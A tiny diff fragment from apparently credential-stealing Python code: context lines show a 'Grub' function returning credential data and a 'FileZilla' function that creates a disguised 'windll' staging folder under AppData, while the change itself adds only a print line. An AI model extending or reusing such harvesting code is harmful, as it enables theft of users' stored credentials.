@@ -73,6 +73,7 @@ def Grub():
             return credentialsData
 
 def FileZilla() -> None:
+    print("FileZilla")
     pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     path = rf'{pathtofile}\windll\Files\FileZilla'
     os.makedirs(path)
